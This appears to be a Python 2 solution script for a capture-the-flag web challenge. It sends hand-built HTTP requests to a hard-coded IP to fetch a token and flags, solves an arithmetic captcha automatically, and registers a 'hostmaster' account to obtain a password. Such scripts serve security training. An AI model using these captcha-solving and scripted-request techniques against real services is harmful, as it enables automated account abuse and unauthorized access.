#!/usr/bin/python
import socket

def Connect(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    return s

def SendDataA1(s, request, requestHost):
    con = "Connection: keep-alive\n\n"
    s.send(request + requestHost + con)

def SendDataA2(s, request, requestHost, token):
    tokenParam = "token=" + token + "\n\n" 
    contentType = "Content-Type: application/x-www-form-urlencoded\n"
    contentLen = "Content-Length: {}\n\n".format(len(tokenParam)-2)
    s.send(request + requestHost + contentType + contentLen + tokenParam)
    return s

def SendDataA3(s, token, solution):
    tokenParam = "&token=" + token + "\n\n"
    captchaParam = "solution=" + str(solution)
    content = captchaParam + tokenParam

    #connection = "Connection: keep-alive\n"
    contentType = "Content-Type: application/x-www-form-urlencoded\n"
    contentLen ="Content-Length: {}\n\n".format(len(content)-2)
    request = "POST /getFlag3Challenge HTTP/1.1\n"
    requestHost = "Host: 54.209.150.110\n"

    s.send(request + requestHost + contentType + contentLen + content) 

def RecieveAndPrintA1(s):
    full = ""
    token = ""

    while True:
        response = s.recv(1024)
        print response
        if response == '':
            break
        else:
            full = response
        
    full = full.split()
    token = full[len(full)-1]
    token = token[:-1]
    return token

def RecieveAndPrintA2(s2, token):
    full = ""
    full2 = ""
    toke = ""

    while True:
        response = s2.recv(1024)
        print response
        if response == '':
            break
        else:
            full = response
        
    full = full.split()
    captcha = full[len(full)-1]
    solution = PerformOperation(captcha)
    print solution

    s2.close()
    s = Connect('54.209.150.110', 80)
    SendDataA3(s, token, solution) 
    while True:
        response2 = s.recv(1024)
        if response2 == '':
            break
        else:
            full2 = response2
    full2 = full2.split()
    toke = full2[len(full2)-1]
    toke = toke[:-1]
    return toke  

def CreateAccount(s, token, request, requestHost):
    tokenParam = "token=" + token + "\n\n"
    content = "username=hostmaster&" + tokenParam
    contentLen ="Content-Length: {}\n\n".format(len(content)-2)
    contentType = "Content-Type: application/x-www-form-urlencoded\n"
    userAgent = "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\n"
    print request + userAgent + requestHost + contentType + contentLen + content
    s.send(request + userAgent + requestHost + contentType + contentLen + content)

def PerformOperation(captcha):
    operator = ''
    operend1 = ''
    operend2 = ''
    captcha = list(captcha)

    for char in captcha:
        if char == '+':
            operator = '+'
        elif char == '-':
            operator = '-'
        elif char == '*':
            operator = '*'
        elif char == '/':
            operator = '/'
        elif char == '"':
            print ''
        elif operator == '':
            operend1 = operend1 + char
        elif operator != '':
            operend2 = operend2 + char
        else:
            print "You broke something.  Fix it."

    if operator == '+':
        captcha = int(operend1) + int(operend2)
    elif operator == '-':
        captcha = int(operend1) - int(operend2)
    elif operator == '*':
        captcha = int(operend1) * int(operend2)
    elif operator == '/':
        captcha = int(operend1) / int(operend2)
    else:
        print "You broke something.  Fix it."
    
    return captcha
    
#------------------------------------------------------------------------------#
host = '54.209.150.110'
port = 80
request = "POST /getSecure HTTP/1.1\n"
requestHost = "Host: 54.209.150.110\n"

s = Connect(host, port)
SendDataA1(s, request, requestHost)
token = RecieveAndPrintA1(s)
print token
s.close()

request = "POST /getFlag2 HTTP/1.1\n"
s = Connect(host, port)
SendDataA2(s, request, requestHost, token)
flag1 = RecieveAndPrintA1(s)
print flag1
s.close()

request = "POST /getFlag3Challenge HTTP/1.1\n"
s = Connect(host, port)
s2 = SendDataA2(s, request, requestHost, token)
flag2 = RecieveAndPrintA2(s2, token)
print flag2
s2.close()

request = "POST /createAccount HTTP/1.1\n"
s = Connect(host, port)
CreateAccount(s, token, request, requestHost)
password = RecieveAndPrintA1(s)
s.close()
print password


